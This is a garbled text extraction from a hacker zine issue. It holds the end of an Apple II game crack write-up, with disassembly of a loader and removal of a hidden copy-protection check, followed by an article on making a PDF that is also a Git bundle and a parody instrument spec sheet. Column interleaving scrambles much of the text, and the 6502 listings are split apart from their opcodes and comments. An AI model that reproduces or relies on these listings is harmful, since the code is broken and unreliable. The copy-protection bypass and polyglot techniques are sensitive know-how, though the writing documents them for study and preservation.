BDFB
BDFE AD E8 C0
60 LDA $C0E8
RTS
o O
BDA7 5D 01 BC EOR $BC01,X
BDAA 99 AC D1 STA $D1AC,Y
o O
BDAD
BDAE
C8
D0 EC
INY
BNE $BD9C
This address was set at $BD5D
based on the target page
(minus 1 so we can add Y
from #$AA..#$FF).
Here endeth nibble loop #3.
Loop #4 reads nibbles $102..$155, combines
them with bits 4-5 of the appropriate nibble from
the first $56, and stores them in bytes $AC..$101
of the target page in memory. (This overwrites two
bytes after the end of the target page, but we’ll re-
store then later from the stack.)
BDB0
BDB2
BDB4
BDB7
BDB9
BDBC
29
A2
AC EC
10
59 00
BC 00
FC
AC
C0
FB
BB
D1
AND
LDX
LDY
BPL
EOR
LDY
o O
#$FC
#$AC
$C0EC
$BDB4
$BB00,Y
$D100,X
o O
If the total sector count (in
$BDEF, set at $BD04 and
decremented at $BDE5) is zero,
we’re done—no need to read
the rest of the track. (This
lets us have sector counts that
are not multiples of 16, i.e.
reading just a few sectors
from the last track of a
multi-track block.)
Execution continues here
(from $BDEF). We’re all done,
so turn off drive motor and
exit.
o O
And that’s all she wroteˆHˆHˆHˆHread.
o O
BDBF 59 00 BC EOR $BC00,Y
BDC2 9D 00 D1 STA $D100,X
o O
BDC5
BDC6
E8
D0 EC
This address was set at $BD45
based on the target page.
INX
BNE $BDB4
Here endeth nibble loop #4.
BDC8
BDCA
BDCD
BDCF
29
AC EC
10
59 00
FC
C0
FB
BB
BDD2 C9 01
BDD4
BDD6
BDD7 A0 01
68
99 00 D1
AND
LDY
BPL
EOR
#$FC
$C0EC
$BDCA
$BB00,Y
o O
Finally, get the last nibble
and convert it to a byte. This
should equal all the previous
bytes XOR’d together. (This
is the standard checksum
algorithm shared by all
16-sector disks.)
CMP #$01 set carry if value is anything
but 0
LDY #$01
PLA
STA $D100,Y Restore the original data in
the two bytes after the target
page. (This does not affect
the carry flag, which we will
check in a moment, but we
need to restore these bytes
now to balance out the
pushing to the stack we did at
$BD65.)
o O
BDDA
BDDB 88
10 F9 DEY
BPL $BDD6
BDDD B0 8A BCS $BD69
BDDF
BDE1 A0 D1
8A LDY #$D1
TXA
BDE2 99 84 BF
I Make My Verse For The Universe
How’s our master plan from page 47 going? Pretty
darn well, I’d say.
if data checksum failed at
$BDD2, start over
o O
STA $BF84,Y
Step 1) write all the game code to a standard disk.
Done.
This was set to the physical
sector number (at $BD3F), so
this is a index into the
16-byte array at $BF84.
Step 2) write an RWTS. Done.
store #$00 at this location in
the sector array to indicate
that we’ve read this sector
Step 3) make them talk to each other.
55The “glue code” for this final step lives
on track 1.
It was loaded into mem-
ory at the very end of the boot sector:
089B-
089D-
089F-
08A1-
A9
A2
A0
4C
01
03
B0
00 BD
LDA
LDX
LDY
JMP
This is the routine that calls Gumboot to load
the appropriate blocks of game code from the disk,
according to the disk map on page 47. Here is the
summary of which sectors are loaded by each block:
cmd
$00
#$01
#$03
#$B0
$BD00
$01
That loads 3 sectors from track 1 into
$B000..$B2FF. $B000 is the high scores, which stays
at $B000. $B100 is moved to zero page. $B200 is
the output vector and final initialization code. This
page is never used by the game. (It was used by the
original RWTS, but that has been greatly simplified
by stripping out the copy protection. I love when
that happens!)
Here is my output vector, replacing the code that
originally lived at $BF6F:
*B200L
B200 C9 07 CMP #$07 B202 90 03 BCC $B207 B204 6C 3A 00 B207 85 5F B209
B20A
B20D A8
B9 97 B2
8D 19 B2 TAY
LDA $B297,Y
STA $B219 set up the call to the screen
fill
B210
B213 B9 9E B2
8D 1C B2 LDA $B29E,Y
STA $B21C set up the call to Gumboot
B216
B218 A9 00
20 69 B2 LDA #$00
JSR $B269 call the appropriate screen fill
B21B 20 2B B2 JSR $B22B B21E
B220
B221 A5 5F
0A
A8 B222
B225
B226
B229 B9 A6 B2
48
B9 A5 B2
48 B22A 60
$02
$03
STA $5F
regular character -> print to
screen
store command in zero page
o O
o O
call Gumboot
LDA $5F
ASL
TAY find the entry point for this
block
LDA $B2A6,Y
PHA
LDA $B2A5,Y
PHA push the entry point to the
stack
RTS and exit via “RTS”
count (X)
$38
$28
$38
$50
$38
$28
$20
page (Y)
$08
$60
$08
$60
$08
$60
$20
(The parameters for command #$06 are the same
as command #$01.)
The lookup at $B210 modified the “JSR” instruc-
tion at $B21B, so each command starts in a different
place:
command or regular
character?
command -> branch
JMP ($003A)
track (A)
$02
$06
$09
$0D
$12
$16
$19
56
B22B
B22D
B230
B232 A9
20 56
A9
D0 02
B2
06
1C LDA
JSR
LDA
BNE #$02
$B256
#$06
$B250 command #$00
B234
B236
B239
B23B
B23D A9
20 56
A9
A2
D0 09
B2
0D
50
13 LDA
JSR
LDA
LDX
BNE #$09
$B256
#$0D
#$50
$B252 command #$01
B23F
B241
B244
B246 A9
20 56
A9
D0 12
B2
16
08 LDA
JSR
LDA
BNE #$12
$B256
#$16
$B250 command #$02
B248
B24A
B24C
B24E
B250
B252
B254
B256
B258
B25A A9
A2
A0
D0
A2
A0
D0
A2
A0
4C 00 19
20
20
0A
28
60
04
38
08
BD LDA
LDX
LDY
BNE
LDX
LDY
BNE
LDX
LDY
JMP #$19
#$20
#$20
$B25A
#$28
#$60
$B25A
#$38
#$08
$BD00 command #$03
B25D
B25F
B262
B264
B266 A9
20 00
A9
A0
4C 00 01
BF
00
B0
BE LDA
JSR
LDA
LDY
JMP #$01
$BF00
#$00
#$B0
$BE00 command #$04: seek to track
1 and write $B000..$B0FF to
sector 0B269
B26B
B26E
B270
B272
B274
B276
B278
B27B
B27D
B27E
B281
B283
B285
B287
B288
B28A
B28B
B28C
B28E
B290
B293
B296
A5
4D 50
85
29
F0
C9
F0
20 66
A9
20 47
A0
A5
91
10
E9
10
AD 56
AD 54
60
C0
60
0F
F5
0F
F1
F8
17
48
F8
27
30
26
88
FB
68
38
01
ED
C0
C0
60
LDA
EOR
STA
AND
BEQ
CMP
BEQ
JSR
LDA
PHA
JSR
LDY
LDA
STA
DEY
BPL
PLA
SEC
SBC
BPL
LDA
LDA
RTS
$60
$C050
$60
#$0F
$B269
#$0F
$B269
$F866
#$17
$F847
#$27
$30
($26),Y
$B285
lookup table for screen fills
B29E [2B 34 3F 48 2A 2A 34] lookup table for Gumboot
calls
lookup table for entry points
[9C
[F8
[34
[57
[5C
[95
[77
T0A,S00
-----------
0021:08
0022:68
0023:29 04
0025:D0 0A
0027:A5 18
0029:C9 02
002B:90 04
002D:A9 10
002F:85 79
0031:A5 79
0033:85 7A
#$01
$B27D
$C056
$C054
B297 [69 7B 69 69 96 96 69]
B2A5
B2A7
B2A9
B2AB
B2AD
B2AF
B2B1
Yeah, so that turned out to be more important
than I thought. After extensive play testing, we 26
discovered the game becomes unplayable on level 3.
How unplayable? Gates that are open won’t
close; balls pass through gates that are already
closed; bins won’t move more than a few pixels.
So, not a crash, and (contrary to our first guess)
not an incompatibility with modern emulators. It
affects real hardware too, and it was intentional.
Deep within the game code, there are several in-
stances of code like this:
exact replica of the screen fill
code that was originally at
$BEB0
0F]
31]
10]
FF]
B2]
B2]
23]
B2FB
B2FD
A2 00
00 B1
95 00
E8
D0 F8
A9 00
4C ED FD
LDX
LDA
STA
INX
BNE
#$00
$B100,X
$00,X
copy $B100 to zero page
$B2F3
LDA #$00
JMP $FDED
print a null character to start
the game
Quod erat liberand one more thing. . .
Oops
A9 34
48
28
LDA #$34
PHA
#$04
$0031
$18
#$02
$0031
#$10
$79
$79
$7A
pop that #$34 off the stack,
but use it as status registers
(weird, but legal—if it turns
out to matter, I can figure out
exactly which status bits get
set and cleared) push the
entry point to the stack
78 SEI set the interrupt flag (new!)
60 RTS and exit via “RTS”
B9 A6 B2
48
B9 A5 B2
48
B22A B22B
PLP
Many thanks to Marco V. for reporting this and
helping reproduce it; qkumba for digging into it to
find the check within the game code; Tom G. for
making the connection between the interrupt flag
and the weird “LDA/PHA/PLP” code at $0372.
Here’s what I said about it when I first saw it:
pop that #$34 off the stack, but use it as status registers (weird,
but legal—if it turns out to matter, I can figure out exactly which
status bits get set and cleared)
26 not
----------
LDA $B2A6,Y
PHA
LDA $B2A5,Y
PHA B222
B225
B226
B229
Heeeeey there. Remember this code?
0372
0374
...
0378
MODE
“PHP” pushes the status registers on the stack,
but “PLA” pulls a value from the stack and stores it
as a byte, in the accumulator. That’s. . . weird. Also,
it’s the reverse of the weird code we saw at $0372,
which took a byte in the accumulator and blitted it
into the status registers. Then “AND #$04” isolates
one status bit in particular: the interrupt flag. The
rest of the code is the game-specific way of making
the game unplayable.
This is a very convoluted, obfuscated, sneaky
way to ensure that the game was loaded through
its original bootloader. Which, of course, it wasn’t.
The solution: after loading each block of game
code and pushing the new entry point to the stack,
set the interrupt flag.
Last but not least, a short routine at $B2F1 to
move zero page into place and start the game. (This
is called because we pushed #$B2/#$F0 to the stack
in our boot sector, at $0895.)
*B2F1L
B2F1
B2F3 BD
B2F6
B2F8
B2F9
DISASSEMBLY
PHP
PLA
AND
BNE
LDA
CMP
BCC
LDA
STA
LDA
STA
me, and not qkumba either, who beat the entire game twice. It was Marco V. Thanks, Marco!
57Taken together, they form a simple substitution
cipher:
• ENTER THREE
• LETTER CODE
• WHEN
• YOU RETIRE
But what is the code?
It turns out that pressing Ctrl-Z again, while
any of the pieces of the cipher are on screen, reveals
another clue:
DOUBLE HELIX
Entering the three-letter code DNA at the “retire-
ment” screen reveals the final secret message:
This Is Not The End, Though
This game holds one more secret, but it’s not related
to the copy protection, thank goodness. As far as
I can tell, this secret has not been revealed in 33
years. qkumba found it because of course he did.
Once the game starts, press Ctrl-J to switch to
joystick mode. Press and hold button 2 to activate
“targeting” mode, then move your joystick to the
bottom-left corner of the screen and also press but-
ton 1. The screen will be replaced by this message:
AHA!
YOU MADE IT!
EITHER YOU ARE AN EXCELLENT GAME-PLAYER
OR (GAH!) PROGRAM-BREAKER!
YOU ARE CERTAINLY ONE OF THE FEW PEOPLE
THAT WILL EVER SEE THIS SCREEN.
THIS
IS
NOT
THE
END,
THOUGH.
IN ANOTHER BR0DERBUND PRODUCT
TYPE 'Z0DWARE' FOR MORE PUZZLES.
HAVE
FUN!
BYE!!
R.A.C.
At time of writing, no one has found the
“Z0DWARE” puzzle. You could be the first!
PRESS CTRL-Z DURING THE CARTOONS
Now, the game has 5 levels. After you com-
plete a level, your character gets promoted: worker,
foreman, supervisor, manager, and finally vice pres-
ident. Each of these is a little cartoon—what kids
today would call a cut scene. When you complete
the entire game, it shows a final screen and your
character retires.
Pressing Ctrl-Z during each cartoon reveals four
ciphers.
After level 1:
Keys and Controls
The game can be played with a joystick or keyboard.
Ctrl-J switch to joystick mode
Ctrl-K switch to keyboard mode
When using a keyboard:
S move bins left
RBJRY JSYRR
D stop bins
After level 2:
F move bins right
Space switch in-tube gates
VRJJRY ZIAR
E increase speed
After level 3:
C decrease speed
ESRB
Return toggle target sighting
After level 4:
FIG YRJMYR
U I O move the target sight
58Cheats
J K L (for when the bombs
M , . start dropping)
I have not enabled any cheats on our release, but I
have verified that they work. You can use any or all
of them:
When using a joystick:
buttons 0+1 toggle target sighting
Stop the clock
T09,S0A,$B1
change 01 to 00
Ctrl-X flip joystick X axis
Ctrl-Y flip joystick Y axis
Other keys:
Start on level 2-5
T09,S0C,$53
change 00 to <level-1>
Ctrl-S toggle sound on/off
Ctrl-R restart level
Ctrl-Q restart game
Ctrl-H view high scores
Acknowledgements
Esc pause/resume game
After the game starts, press Ctrl-U Ctrl-C
Ctrl-B in sequence to see a secret credits page that
lists most of the people involved in making the game.
Sadly, the author of the copy protection is not listed.
Thanks to Alex, Andrew, John, Martin, Paul,
Quinn, and Richard for reviewing drafts of this
write-up.
And finally, many thanks to qkumba: Shifter of
Bits, Master of the Stack, author of Gumboot, and
my friend.
>>>>>>>> CREDITS <<<<<<<<
THE FOLLOWING PEOPLE HAD SOMETHING TO DO
WITH THE COMPLETION OF THIS PROGRAM:
HENRY MENDOZA
ANDY ARMSTRONG
DON HOHL
JULIE LETERNEAU
CHRIS QUAN
PAT MCCARTHY
PAUL CASAUDOUMECQ
JIM KASSENBROCK
JON LOEB
FRANK PAP
RON LEAR
MARK COOK
MILTON & ROBERTA COOK
COREY KOSAK
MR. STAUB
U.C.B.C.
AND ALL OF THE AMAZING PEOPLE AT
BR0DERBUND
5915:07
In Which a PDF is a Git Repository
Containing its own L A TEX Source
and a Copy of Itself
by Evan Sultanik
Have you ever heard of the git bundle com-
mand? I hadn’t. It bundles a set of Git objects—
potentially even an entire repository—into a single
file. Git allows you to treat that file as if it were
a standard Git database, so you can do things like
clone a repo directly from it. Its purpose is to easily
sneakernet pushes or even whole repositories across
air gaps.
·— —· — — — —·—·
— — — ·—·
course raises the question: What is the format for a
Git Packfile?
Git does have some internal documentation in
Documentation/technical/pack-format.txt
however, it is rather sparse, and does not provide
enough detail to fully parse the format. The docu-
mentation also has some “observations” that suggest
it wasn’t even written by the file format’s creator
and instead was written by a developer who was
later trying to make sense of the code.
Luckily, Aditya Mukerjee already had to reverse
engineer the file format for his GitGo clean-room
implementation of Git, and he wrote an excellent
blog entry about it. 27
— —· — ·– —· — — —
Neighbors, it’s possible to create a PDF that is
also a Git repository.
$ git clone PDFGitPolyglot.pdf foo
Cloning into ’foo’...
Receiving objects: 100% (174/174), 103.48 KiB, done.
Resolving deltas: 100% (100/100), done.
$ cd foo
$ ls
PDFGitPolyglot.pdf PDFGitPolyglot.tex
‘P’ ‘A’ ‘C’ ‘K’ 00 00 00 02 # objects
magic
version
big-endian 4 byte int
one data chunk for each object
20-byte SHA-1 of all the previous data in the pack
15:07.1
The Git Bundle File Format
Although not entirely required to understand the
polyglot, I think it is useful to describe the git pack-
file format here, since it is not well documented else-
where. If that doesn’t interest you, it’s safe to skip
to the next section. But if you do proceed, I hope
you like Soviet holes, dear neighbor, because chasing
this rabbit might remind you of Кольская.
The file format for Git bundles doesn’t appear to
be formally specified anywhere, however, inspecting
bundle.c reveals that it’s relatively straightforward:
# v2 git bundle
← -
Git Bundle Signature
3aa340a2e3d125ab6703e5c9bdfede2054a9c0c5
refs/heads/master ← -
4146cfe2fe9249fc14623f832587efe197ef5d2d
refs/stash
3aa340a2e3d125ab6703e5c9bdfede2054a9c0c5
refs/remotes/origin/master ← -
← -
babdda4735ef164b7023be3545860d8b0bae250a
HEAD ← -
← -
PACK . . .
Git Packfile
Git has another custom format called a Packfile that
it uses to compress the objects in its database, as
well as to reduce network bandwidth when pushing
and pulling. The packfile is therefore an obvious
choice for storing objects inside bundles. This of
27 https://codewords.recurse.com/issues/three/unpacking-git-packfiles
60Right, the next step is to figure out the “chunk”
format. The chunk header is variable length, and
can be as small as one byte. It encodes the object’s
type and its uncompressed size. If the object is a
delta (i.e., a diff, as opposed to a complete object),
the header is followed by either the SHA-1 hash of
the base object to which the delta should be ap-
plied, or a byte reference within the packfile for the
start of the base object. The remainder of the chunk
consists of the object data, zlib-compressed.
The format of the variable length chunk header
is pictured in Figure 4. The second through fourth
most significant bits of the first byte are used to
store the object type. The remainder of the bytes
in the header are of the same format as bytes two
and three in this example. This example header
represents an object of type 11 2 , which happens
to be a git blob, and an uncompressed length of
(100 2 << 14) + (1010110 2 << 7) + 1001001 2 = 76,617
bytes. Since this is not a delta object, it is imme-
diately followed by the zlib-compressed object data.
The header does not encode the compressed size of
the object, since the DEFLATE encoding can de-
termine the end of the object as it is being decom-
pressed.
At this point, if you found The Life and Opin-
ions of Tristram Shandy to be boring or frustrating,
then it’s probably best to skip to the next section,
’cause it’s turtles all the way down.
“
To come at the exa weight of things in
the scientific õeel-yard, the fulchrum, [Wal-
ter Shandy] would say, should be almoõ in-
visible, to avoid all fri ion from popular
tenets;—without this the minutiæ of philos-
ophy, which should always turn the balance,
will have no weight at all. Knowledge, like
matter, he would affirm, was divisible in
infinitum;—that the grains and scruples were
as much a part of it, as the gravitation of the
whole world.
set can typically be encoded in two or three bytes,
it’s significantly smaller than a 20-byte SHA-1 hash.
One must understand how these offset delta objects
are encoded if—say, for some strange, masochistic
reason—one wanted to change the order of objects
within a packfile, since doing so would break the
negative offsets. (Foreshadowing!)
One would think that git would use the same
multi-byte length encoding that they used for the
uncompressed object length. But no! This is what
we have to go off of from the git documentation:
n bytes with MSB set in all but the last one.
The offset is then the number constructed by
concatenating the lower 7 bit of each byte, and
for n >= 2 adding 2^7 + 2^14 + ... + 2^(7*(n-1))
to the result.
Right. Some experimenting resulted in the following
decoding logic that appears to work:
def decode_obj_ref(data):
bytes_read = 0
reference = 0
for c in map(ord, data):
bytes_read += 1
reference <<= 7
reference += c & 0b01111111
if not (c & 0b10000000):
break
if bytes_read >= 2:
reference += (1 << (7 * (bytes_read - 1)))
return reference, bytes_read
The rabbit hole is deeper still; we haven’t yet dis-
covered the content of the compressed delta objects,
let alone how they are applied to base objects. At
this point, we have more than sufficient knowledge
to proceed with the PoC, and my canary died ages
ago. Aditya Mukerjee did a good job of explaining
the process of applying deltas in his blog post, so I
will stop here and proceed with the polyglot.
”
15:07.2
A Minimal Polyglot PoC
We now know that a git bundle is really just a git
packfile with an additional header, and a git packfile
stores individual objects using zlib, which uses the
DEFLATE compression algorithm. DEFLATE sup-
ports zero compression, so if we can store the PDF
in a single object (as opposed to it being split into
deltas), then we could theoretically coerce it to be
intact within a valid git bundle.
Forcing the PDF into a single object is easy: We
just need to add it to the repo last, immediately
before generating the bundle.
There are two types of delta objects: refer-
ences (object type 7) and offsets (object type 6).
Reference delta objects contain an additional
20 bytes at the end of the header before the zlib-
compressed delta data. These 20 bytes contain the
SHA-1 hash of the base object to which the delta
should be applied. Offset delta objects are exactly
the same, however, instead of referencing the base
object by its SHA-1 hash, it is instead represented
by a negative byte offset to the start of the ob-
ject within the pack file. Since a negative byte off-
61first byte
second byte
third byte
1 0 1 1 0 1 0 0 1 1 0 1 0 1 1 0 0 1 0 0 1 0 0 1
object type first four
bits of
the length
(big-endian)
if the MSB is one,
then this is not
the last byte
the next seven
bits of the length
(big-endian)
the next seven
bits of the length
(big-endian)
MSB is zero,
MSB is one,
so this is the last byte
so this is not the last byte
Figure 4. Format of the git packfile’s variable length chunk header.
Getting the object to be compressed with zero
compression is also relatively easy. That’s because
git was built in almost religious adherence to The
UNIX Philosophy: It is architected with hundreds of
sub commands it calls “plumbing,” of which the vast
majority you will likely have never heard. For ex-
ample, you might be aware that git pull is equiv-
alent to a git fetch followed by a git merge. In
fact, the pull code actually spawns a new git
child process to execute each of those subcommands.
Likewise, the git bundle command spawns a git
pack-objects child process to generate the packfile
portion of the bundle. All we need to do is inject
the --compression=0 argument into the list of com-
mand line arguments passed to pack-objects. This
is a one-line addition to bundle.c:
1. Adobe, being Adobe, will refuse to open the
polyglot unless the PDF is version 1.4 or ear-
lier. I guess it doesn’t like some element of the
git bundle signature or digest if it’s PDF 1.5.
Why? Because Adobe, that’s why.
2. Leaving the entire Git bundle uncompressed is
wasteful if the repo contains other files; really,
we only need the PDF to be uncompressed.
3. If the PDF is larger than 65,535 bytes—the
maximum size of an uncompressed DEFLATE
block—then git will inject 5-byte deflate block
headers inside the PDF, likely corrupting it.
4. Adobe will also refuse to open the polyglot
unless the PDF is near the beginning of the
packfile. 28
argv_array_pushl(
&pack_objects.args,
"pack-objects", "--all-progress-implied",
"--compression=0",
"--stdout", "--thin", "--delta-base-offset",
The first limitation is easy to fix by instruct-
ing L A TEX to produce a version 1.4 PDF by adding
\pdfminorversion=4 to the document.
The second limitation is a simple matter of soft-
ware engineering, adding a command line argument
to the git bundle command that accepts the hash
of the single file to leave uncompressed, and passing
that hash to git pack-objects. I have created a
fork of git with this feature. 29
As an aside, while fixing the second limitation
I discovered that if a file has multiple PDFs con-
catenated after one another (i.e., a git bundle poly-
glot with multiple uncompressed PDFs in the repo),
then the behavior is viewer-dependent: Some view-
ers will render the first PDF, while others will ren-
der the last. That’s a fun way to generate a PDF
that displays completely different content in, say,
macOS Preview versus Adobe.
The third limitation is very tricky, and ulti-
mately why this polyglot was not used for the PDF
NULL);
Using our patched version of git, every object
stored in the bundle will be uncompressed!
$
$
$
$
$
export PATH=/path/to/patched/git:$PATH
git init
git add article.pdf
git commit article.pdf -m "added"
git bundle create PDFGitPolyglot.pdf --all
Any vanilla, un-patched version of git will be able to
clone a repo from the bundle. It will also be a valid
PDF, since virtually all PDF readers ignore garbage
bytes before and after the PDF.
15:07.3
Generalizing the PoC
There are, of course, several limitations to the min-
imal PoC given in the previous section:
28 Requiring
the PDF header to start near the beginning of a file is common for many, but not all, PDF viewers.
29 https://github.com/ESultanik/git/tree/UncompressedPack
62of this issue of PoCkGTFO. I’ve a solution, but it
will not work if the PDF contains any objects (e.g.,
images) that are larger than 65,535 bytes. A uni-
versal solution would be to break up the image into
smaller ones and tile it back together, but that is not
feasible for a document the size of a PoCkGTFO is-
sue.
we moved the locations of the DEFLATE headers,
thus affecting the hash.
At this point, we have all the tools necessary to
create a generalized PDF/Git Bundle polyglot for
almost any PDF and git repository. The only re-
maining hurdle is that some viewers require that the
PDF occur as early in the packfile as possible. At
first, I considered applying another patch directly to
the git source code to make the uncompressed ob-
ject first in the packfile. This approach proved to
be very involved, in part due to git’s UNIX design
philosophy and architecture of generic code reuse.
We’re already updating the packfile’s SHA-1 hash
due to changing the DEFLATE headers, so instead I
decided to simply reorder the objects after-the-fact,
subsequent to the DEFLATE header fix but before
we update the hash. The only challenge is that mov-
ing objects in the packfile has the potential to break
offset delta objects, since they refer to their base ob-
jects via a byte offset within the packfile. Moving
the PDF to the beginning will break any offset delta
objects that occur after the original position of the
PDF that refer to base objects that occur before the
original position of the PDF. I originally attempted
to rewrite the broken offset delta objects, which is
why I had to dive deeper into the rabbit hole of the
packfile format to understand the delta object head-
ers. (You saw this at the end of Section 15:07.1, if
you were brave enough to finish it.) Rewriting the
broken offset delta objects is the correct solution,
but, in the end, I discovered a much simpler way.
DEFLATE headers for uncompressed blocks are
very simple: The first byte encodes whether the fol-
lowing block is the last in the file, the next two bytes
encode the block length, and the last two bytes are
the ones’ complement of the length. Therefore, to
resolve this issue, all we need to do is move all of
the DEFLATE headers that zlib created to different
positions that won’t corrupt the PDF, and update
their lengths accordingly.
Where can we put a 5-byte DEFLATE header
such that it won’t corrupt the PDF? We could
use our standard trick of putting it in a PDF ob-
ject stream that we’ve exploited countless times be-
fore to enable PoCkGTFO polyglots. The trouble
with that is: Object streams are fixed-length, so
once the PDF is decompressed (i.e., when a repo is
cloned from the git bundle), then all of the 5-byte
DEFLATE headers will disappear and the object
stream lengths would all be incorrect. Instead, I
chose to use PDF comments, which start at any oc-
currence of the percent sign character (%) outside a
string or stream and continue until the first occur-
rence of a newline. All of the PDF viewers I tested
don’t seem to care if comments include non-ASCII
characters; they seem to simply scan for a newline.
Therefore, we can inject “%\n” between PDF objects
and move the DEFLATE headers there. The only
caveat is that the DEFLATE header itself can’t con-
tain a newline byte (0x0A), otherwise the comment
would be ended prematurely. We can resolve that,
if needed, by adding extra spaces to the end of the
comment, increasing the length of the following DE-
FLATE block and thus increasing the length bytes
in the DEFLATE header and avoiding the 0x0A.
The only concession made with this approach is that
PDF Xref offsets in the deflated version of the PDF
will be off by a multiple of 5, due to the removed
DEFLATE headers. Fortunately, most PDF read-
ers can gracefully handle incorrect Xref offsets (at
the expense of a slower loading time), and this will
only affect the PDF contained in the repository, not
the PDF polyglot.
“
As a matter of fact, G-d just questioned my
judgment. He said, ‘Terry, are you worthy to
be the man who makes The Temple? If you
are, you must answer: Is this [dastardly], or
is this divine intellect?’
”
—Terry A. Davis, creator of TempleOS
self-proclaimed “smartest
programmer that’s ever lived”
Terry’s not the only one who’s written a com-
piler!
In the previous section, recall that we created
the minimal PoC by patching the command line
arguments to pack-objects. One of the com-
mand line arguments that is already passed by de-
fault is --delta-base-offset. Running git help
pack-objects reveals the following:
As a final step, we need to update the SHA-1 sum
at the end of the packfile (q.v. Section 15:07.1), since
63A packed archive can express the base object
of a delta as either a 20-byte object name
or as an offset in the stream, but ancient
versions of Git don’t understand the latter.
By default, git pack-objects only uses the
former format for better compatibility. This
option allows the command to use the latter
format for compactness. Depending on the
average delta chain length, this option
typically shrinks the resulting packfile by
3-5 per-cent.
the PDF, ensuring that the %%EOF is exactly 20 bytes
from the end of the file, by creating a second un-
compressed git object as the very end of the packfile
(right before the final 20 byte SHA-1 checksum).
We could then move the trailer from the end of the
original PDF at the start of the pack to the new git
object at the end of the pack. Finally, we could en-
capsulate the “middle” objects of the packfile inside
a PDF stream object, such that they are ignored by
the PDF. The tricky part is that we would have to
know how many bytes will be in that stream before
we add the PDF to the git database. That’s theoret-
ically possible to do a priori, but it’d be very labor
intensive to pull off. Furthermore, using this ap-
proach will completely break the inner PDF that is
produced by cloning the repository, since its trailer
will then be in a separate file. Therefore, I chose to
live with Adobe’s helpfulness and not pursue this fix
for the PoC.
So all we need to do is remove the
--delta-base-offset argument and git will not
include any offset delta objects in the pack!
·— —· — — — —·—·
— — — ·—·
— —· — ·– —· — — —
Okay, I have to admit something: There is
one more challenge. You see, the PDF stan-
dard (ISO 32000-1) says
“
The trailer of a PDF file enables a conform-
ing reader to quickly find the cross-reference
table and certain special objects. Conform-
ing readers should read a PDF file from its
end. The last line of the file shall contain
only the end-of-file marker, %%EOF.
·— —· — — — —·—·
”
Granted, we are producing a PDF that conforms to
version 1.4 of the specification, which doesn’t ap-
pear to have that requirement. However, at least as
early as version 1.3, the specification did have an im-
plementation note that Acrobat requires the %%EOF
to be within the last 1024 bytes of the file. Either
way, that’s not guaranteed to be the case for us, es-
pecially since we are moving the PDF to be at the
beginning of the packfile. There are always going to
be at least 20 trailing bytes after the PDF’s %%EOF
(namely the packfile’s final SHA-1 checksum), and
if the git repository is large, there are likely to be
more than 1024 bytes.
Fortunately, most common PDF readers don’t
seem to care how many trailing bytes there are, at
least when the PDF is version 1.4. Unfortunately,
some readers such as Adobe’s try to be “helpful,”
silently “fixing” the problem and offering to save the
fixed version upon exit. We can at least partially fix
30 unzip
— — — ·—·
— —· — ·– —· — — —
The feelies contain a standalone PDF of this ar-
ticle that is also a git bundle containing its L A TEX
source, as well as all of the code necessary to regen-
erate the polyglot. 30 Clone it to take a look at the
history of this article and its associated code! The
code is also hosted on GitHub 31 .
Thus—thus, my fellow-neighbours and as-
sociates in this great harveõ of our learn-
ing, now ripening before our eyes; thus it
is, by ôow õeps of casual increase, that our
knowledge physical, metaphysical, physiolog-
ical, polemical, nautical, mathematical, ænig-
matical, technical, biographical, romantical,
chemical, obõetrical, and polyglottical, with
fifty other branches of it, (moõ of ’em end-
ing as these do, in ical) have for these four laõ
centuries and more, gradually been creeping
upwards towards that Akme of their perfec-
tions, from which, if we may form a conjec-
ture from the advances of these laõ 5 pages,
we cannot possibly be far off.
pocorgtfo15.pdf PDFGitPolyglot.pdf
31 https://github.com/ESultanik/PDFGitPolyglot
64POC-1337
INSTRUMENTS
Page 65
Cyberencabulator
Jan. 1, 1970
FUNCTION
To measure inverse reactive current in uni-
versal phase detractors with display of percent
realization.
OPERATION
Based on the principle of power generation
by the modial interaction of magnetoreluctance
and capacitative diractance, the Cyberencab-
ulator negates the relative motion of conven-
tional conductors and fluxes. It consists of a
baseplate of prefabulated Amulite, surmounted
by a malleable logarithmic casing in such a
way that the two main spurving bearings are
aligned with the parametric fan.
Six gyro-controlled antigravic marzelvanes
are attached to the ambifacent wane shafts to
prevent internal precession. Along the top,
adjacent to the panandermic semi-boloid sta-
tor slots, are forty-seven manestically spaced
grouting brushes, insulated with Glyptal-
impregnated, cyanoethylated kraft paper bush-
ings. Each one of these feeds into the rotor
slip-stream, via the non-reversible differential
tremie pipes, a 5 per cent solution of reminative
Tetraethyliodohexamine, the specific pericosity
6÷7
, where “C”
of which is given by P = 2.5C n
is Chlomondeley’s annular grillage coefficient
and “n” is the diathetical evolute of retrograde
temperature phase disposition.
The two panel meters display inrush cur-
rent and percent realization.
In addition,
whenever a barescent skor motion is required,
it may be employed with a reciprocating dingle
arm to reduce the sinusoidal depleneration in
nofer trunions.
Solutions are checked via Zahn Viscosime-
try techniques. Exhaust orifices receive stan-
dard Blevinometric tests. There is no known
Orth Effect.
TECHNICAL FEATURES
• Panandermic semi-boloid stator slots
• Panel meter covers treated with Shure
Stat (guaranteed to build up electrostatic
charge in less than 1 second).
• Manestically spaced grouting brushes
• Prefabulated Amulite baseplate
• Pentametric fan
STANDARD RATINGS
Rating
0–1024
Old
Catalog No.
8080808G6S*
New Computer
Insensitive
Catalog No.
25504446POC1†
* Included Qty. 6 NO-BLO‡ fuses.
† Includes Magnaglas circuit breaker with
polykrapolene-coated contacts rated 75A
Wolfram.
‡ Reg. T.M. Shenzhen Xiao Baoshi Elec-
tronics Co., Ltd.
ACCESSORIES
1. 8 ounces 5 per cent Tetraethyliodohexam-
ine with 0.01N Halogen tracer solution.
2. Interelectrode diffusion integrator.
3. Noninductive-wound inverse conductance
control in little black box.
4. Analog to digital converter with reflected
levorotatory BCD output (binary-coded
decimal i.e.: 7, 4, 2, 1).
5. Quasistatic regeneration oscillator with
output conductance of 17.8 millimhos.
APPLICATION
Measuring Inverse Reactive Current—
CAUTION: Because of the replenerative flow
characteristics of positive ions in unilateral
phase detractors, the use of the quasistatic
regeneration oscillator is recommended if Cy-
berencabulator is used outside of an air condi-
tioned server room.
Reduction of Sinusoidal Depleneration
—Before use, the system should be calibrated
with a gyro-controlled Sine-Wave Director, the
output of which should be of the cathode fol-
lower type.
Note: If only Cosine-Wave Directors are avail-
able, their output must be first fed into a Phase
Inverter with parametric negative-time com-
pensators. Caution: Only Phase Inverters with
an output conductance of 17.8 ± 1 millimhos
should be employed so as to match the charac-
teristics of the quasistatic regeneration oscilla-
tor.
Voltage Levels—Above 750V Do Not Use
Caged Resistors to get within self-contained
rating of Cyberencabulator. Do Use Sequen-
tial Transformers. See POC-9001.
